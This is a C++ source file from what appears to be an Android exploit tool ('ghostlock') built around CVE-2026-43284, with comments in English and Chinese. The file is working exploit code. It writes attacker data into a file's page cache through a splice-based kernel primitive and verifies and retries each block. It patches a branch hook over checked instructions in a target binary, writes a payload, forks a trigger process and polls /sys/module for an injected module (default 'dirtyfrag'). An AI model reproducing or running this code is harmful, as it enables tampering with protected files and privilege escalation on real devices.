/** @file backend/cve_2026_43284/steps/pagecache_steps.cpp
 *  The block loop every image write shares. See the header for the boundary.
 */
#include "jni/gl_log.hpp"
#include <chrono>
#include "backend/cve_2026_43284/steps/pagecache_steps.hpp"

#include "backend/cve_2026_43284/kernel_access.hpp"
#include "backend/cve_2026_43284/landing/pagecache_door_linux.hpp"
#include "backend/cve_2026_43284/landing/pagecache_landing.hpp"
#include "backend/cve_2026_43284/landing/pagecache_write.hpp"
#include "backend/cve_2026_43284/landing/real_splice_io.hpp"

#include <cstring>
#include <cerrno>
#include <cstdio>
#include <sys/wait.h>
#include <unistd.h>

namespace ghostlock::backend::cve_2026_43284::steps {
    /** Names the caller can print; static storage, so the pointer stays valid. */
    inline constexpr const char *kImageEmpty = "step-image-empty";
    inline constexpr const char *kImageNotAligned = "step-width-zero";
    inline constexpr const char *kWriteRefused = "step-write-refused";
    inline constexpr const char *kVerifyFailed = "step-verify-failed";
    inline constexpr const char *kNoAccess = "step-access-missing";
    inline constexpr const char *kPlanMissing = "step-plan-missing";
    inline constexpr const char *kBranchOutOfRange = "step-branch-out-of-range";
    inline constexpr const char *kGuardInAnotherBlock = "step-guard-in-another-block";
    inline constexpr const char *kSiteBlockUnread = "step-site-block-unread";
    inline constexpr const char *kGuardMismatch = "step-guard-mismatch";
    inline constexpr const char *kDisplacedMismatch = "step-displaced-mismatch";
    inline constexpr const char *kHookWriteRefused = "step-hook-write-refused";
    inline constexpr const char *kHookVerifyFailed = "step-hook-verify-failed";
    inline constexpr const char *kPayloadNotBuilt = "step-payload-not-built";
    inline constexpr const char *kTriggerForkFailed = "step-trigger-fork-failed";
    inline constexpr const char *kTriggerWaitFailed = "step-trigger-wait-failed";
    inline constexpr const char *kWaitNoClock = "step-wait-no-clock";
    inline constexpr const char *kWaitFailureMarker = "step-wait-failure-marker";
    inline constexpr const char *kWaitModuleGone = "step-wait-module-gone";
    inline constexpr const char *kWaitTimeout = "step-wait-timeout";
    inline constexpr const char *kStepInitializeRefused = "step-initialize-refused";
    /** The device sleep, used by the trigger grandchild. */
    inline void device_sleep_ms(std::uint32_t ms) noexcept { ::usleep(static_cast<useconds_t>(ms) * 1000U); }

    bool pagecache_step_by_name(std::string_view name, PagecacheStep &out) noexcept {
        for (std::size_t i = 0U; i < kPagecacheStepCount; ++i) {
            const std::string_view candidate(kPagecacheStepNames[i]);
            if (candidate == name) {
                out = static_cast<PagecacheStep>(i);
                return true;
            }
        }
        return false;
    }

    const char *pagecache_step_name(PagecacheStep step) noexcept {
        const auto index = static_cast<std::size_t>(step);
        return index < kPagecacheStepCount ? kPagecacheStepNames[index] : "unknown";
    }

    bool write_hook(HookRequest &request, const char **refusal) noexcept {
        if (request.access == nullptr || request.params == nullptr) {
            *refusal = kNoAccess;
            return false;
        }
        if (request.plan == nullptr) {
            *refusal = kPlanMissing;
            return false;
        }
        if (request.width < 8U) {
            *refusal = kImageNotAligned;
            return false;
        }
        const hook::SentryPlan &plan = *request.plan;
        std::uint32_t branch = 0U;
        if (hook::hook_branch(plan, branch) != hook::SentryError::Ok) {
            *refusal = kBranchOutOfRange;
            return false;
        }
        const std::uint64_t block_at = plan.hook_file_offset - (plan.hook_file_offset % request.width);
        const std::size_t within = static_cast<std::size_t>(plan.hook_file_offset - block_at);
        if (within < 4U) {
            *refusal = kGuardInAnotherBlock;
            return false;
        }
        request.params->offset = block_at;
        request.params->offset_set = true;
        std::byte block[64] = {};
        GL_LOGI("hook: read site block at=%llu width=%zu channel=%d offset_set=%d",
                static_cast<unsigned long long>(block_at), request.width,
                static_cast<int>(request.channel), request.params->offset_set ? 1 : 0);
        const auto before = request.access->read(0U, request.width, request.channel, *request.params);
        if (!before.ok() || before.value.size() != request.width) {
            *refusal = kSiteBlockUnread;
            return false;
        }
        for (std::size_t i = 0U; i < request.width; ++i) { block[i] = before.value[i]; }
        const auto word_at = [&](std::size_t at) noexcept {
            return static_cast<std::uint32_t>(std::to_integer<std::uint8_t>(block[at])) |
                   (static_cast<std::uint32_t>(std::to_integer<std::uint8_t>(block[at + 1U])) << 8U) |
                   (static_cast<std::uint32_t>(std::to_integer<std::uint8_t>(block[at + 2U])) << 16U) |
                   (static_cast<std::uint32_t>(std::to_integer<std::uint8_t>(block[at + 3U])) << 24U);
        };
        if (word_at(within - 4U) != plan.guard_instruction) {
            *refusal = kGuardMismatch;
            return false;
        }
        if (word_at(within) != plan.displaced_instruction) {
            *refusal = kDisplacedMismatch;
            return false;
        }
        block[within] = static_cast<std::byte>(branch & 0xFFU);
        block[within + 1U] = static_cast<std::byte>((branch >> 8U) & 0xFFU);
        block[within + 2U] = static_cast<std::byte>((branch >> 16U) & 0xFFU);
        block[within + 3U] = static_cast<std::byte>((branch >> 24U) & 0xFFU);
        const auto wrote = request.access->write(0U, std::span<const std::byte>(block, request.width),
                                                request.channel, *request.params);
        if (!wrote.ok() || wrote.value != request.width) {
            *refusal = kHookWriteRefused;
            return false;
        }
        const auto after = request.access->read(0U, request.width, request.channel, *request.params);
        if (!after.ok() || after.value.size() != request.width ||
            std::memcmp(after.value.data(), block, request.width) != 0) {
            *refusal = kHookVerifyFailed;
            return false;
        }
        std::uint8_t payload[64U * 64U] = {};
        std::size_t payload_size = 0U;
        if (hook::build_sentry_payload(plan, payload, sizeof(payload), payload_size) != hook::SentryError::Ok) {
            *refusal = kPayloadNotBuilt;
            return false;
        }
        WriteRequest body{};
        body.access = request.access;
        body.params = request.params;
        body.image = std::span<const std::byte>(reinterpret_cast<const std::byte *>(payload), payload_size);
        body.offset = plan.payload_file_offset;
        body.width = request.width;
        body.channel = request.channel;
        return write_image_verified(body, refusal);
    }
    const char *trigger_orphan(std::uint32_t delay_ms) noexcept {
        const pid_t child = ::fork();
        if (child < 0) {
            return kTriggerForkFailed;
        }
        if (child == 0) {
            const pid_t grandchild = ::fork();
            if (grandchild < 0) {
                ::_exit(127);
            }
            if (grandchild == 0) {
                if (delay_ms != 0U) { device_sleep_ms(delay_ms); }
                ::_exit(0);
            }
            ::_exit(0);
        }
        int status = 0;
        while (::waitpid(child, &status, 0) < 0) {
            if (errno != EINTR) {
                return kTriggerWaitFailed;
            }
        }
        return nullptr;
    }

    const char *wait_for_module(const WaitRequest &request) noexcept {
        if (request.exists == nullptr || request.sleep_ms == nullptr) {
            return kWaitNoClock;
        }
        const char *const success = request.success_marker == nullptr ? "" : request.success_marker;
        const char *const failure = request.failure_marker == nullptr ? "" : request.failure_marker;
        const char *const module_dir = request.module_dir == nullptr ? "" : request.module_dir;
        const bool named = request.module_name != nullptr && request.module_name[0] != '\0';
        char module_path[160] = {};
        std::snprintf(module_path, sizeof(module_path), "/sys/module/%s", named ? request.module_name : "dirtyfrag");
        bool module_seen = false;
        std::uint32_t elapsed = 0U;
        const std::uint32_t poll = request.poll_ms == 0U ? 1U : request.poll_ms;
        while (elapsed < request.budget_ms) {
            if (failure[0] != '\0' && request.exists(failure)) {
                return kWaitFailureMarker;
            }
            if (success[0] != '\0' && request.exists(success)) {
                return nullptr;
            }
            const bool present = (module_dir[0] != '\0' && request.exists(module_dir)) ||
                                 request.exists(module_path);
            if (present) {
                module_seen = true;
            } else if (module_seen) {
                return kWaitModuleGone;
            }
            request.sleep_ms(poll);
            elapsed += poll;
        }
        return kWaitTimeout;
    }
    bool write_image_verified(WriteRequest &request, const char **refusal) noexcept {
        if (request.access == nullptr || request.params == nullptr) {
            *refusal = kNoAccess;
            return false;
        }
        if (request.width == 0U) {
            *refusal = kImageNotAligned;
            return false;
        }
        if (request.image.empty()) {
            *refusal = kImageEmpty;
            return false;
        }
        const std::size_t blocks = (request.image.size() + request.width - 1U) / request.width;
        for (std::size_t block = 0U; block < blocks; ++block) {
            const std::size_t at = block * request.width;
            const std::size_t take = request.image.size() - at < request.width ?
                                     request.image.size() - at : request.width;
            /* A short last block is padded with zeros, exactly as the tool"s own loop did. */
            std::byte in[64] = {};
            std::memcpy(in, request.image.data() + at, take);
            request.params->offset = request.offset + at;
            request.params->offset_set = true;
            const auto written = request.access->write(0U, std::span<const std::byte>(in, request.width),
                                                      request.channel, *request.params);
            if (!written.ok() || written.value != request.width) {
                /* 说清是哪一层：带上访问层的状态名（NotOpen / NoOldBlock / … 都在那里记着）。 */
                static char message[96] = {};
                std::snprintf(message, sizeof(message), "step-write-refused:%s",
                              ghostlock::contract::KernelAccess::status_name(written.status));
                *refusal = message;
                return false;
            }
            /* 写是派发式的（成功只到 Dispatched）：落盘要等内核处理，所以这里做**有界重试**。
             * 耐心由调用方给（request.budget_ms；0 = 不重试，与旧行为一致）—— 等多久是上层的事。 */
            const auto verify_deadline = std::chrono::steady_clock::now() +
                                         std::chrono::milliseconds(request.budget_ms);
            GL_LOGI("block[%zu]: wrote=%zu/%zu offset=%llu budget_ms=%llu", at, written.value, request.width,
                    static_cast<unsigned long long>(request.offset + at),
                    static_cast<unsigned long long>(request.budget_ms));
            std::size_t tries = 0U;
            const auto block_start = std::chrono::steady_clock::now();
            for (;;) {
                tries += 1U;
                if (tries > 1U) {
                    /* 发送会偶发失败（真机见 splice NOT sent err=-111）⇒ 重试回合里**重发**一次；
                     * 窗口每次都重读旧块并重算 IV，所以重复发送在语义上是安全的（防重放会丢弃多余副本）。 */
                    request.params->offset = request.offset + at;
                    request.params->offset_set = true;
                    const auto again = request.access->write(0U, std::span<const std::byte>(in, request.width),
                                                             request.channel, *request.params);
                    GL_LOGI("block[%zu] try=%zu resent=%zu/%zu", at, tries, again.value, request.width);
                }
            const auto back = request.access->read(0U, request.width, request.channel, *request.params);
                if (back.ok() && back.value.size() == request.width &&
                    std::memcmp(back.value.data(), in, request.width) == 0) {
                    /* How long did this block take, and how many tries? A block that never matches
                     * burns the whole budget, which is what turns a five second chain into minutes. */
                    const auto block_us = std::chrono::duration_cast<std::chrono::microseconds>(
                        std::chrono::steady_clock::now() - block_start).count();
                    GL_LOGI("block[%zu]: landed tries=%zu took=%lld us", at, tries,
                            static_cast<long long>(block_us));
                    break;  /* landed：预算内比中 */
                }
                if (std::chrono::steady_clock::now() >= verify_deadline) {
                    const unsigned char *want = reinterpret_cast<const unsigned char *>(in);
                    const unsigned char *got = back.ok() ? reinterpret_cast<const unsigned char *>(back.value.data()) : nullptr;
                    if (got != nullptr && back.value.size() == request.width) {
                        GL_LOGI("block[%zu] verify failed: want %02x%02x%02x%02x got %02x%02x%02x%02x", at,
                                want[0], want[1], want[2], want[3], got[0], got[1], got[2], got[3]);
                    } else {
                        GL_LOGI("block[%zu] verify failed: want %02x%02x%02x%02x got unreadable (ok=%d size=%zu)", at,
                                want[0], want[1], want[2], want[3], back.ok() ? 1 : 0, back.value.size());
                    }
                    *refusal = kVerifyFailed;  /* budget-exhausted：预算用尽仍不中 */
                    GL_LOGI("block[%zu]: budget exhausted after %zu tries", at, tries);
                    return false;
                }
                ::usleep(2000);  /* 一个轮询间隔（2 ms） */
            }
        }
        return true;
    }
}  // namespace ghostlock::backend::cve_2026_43284::steps
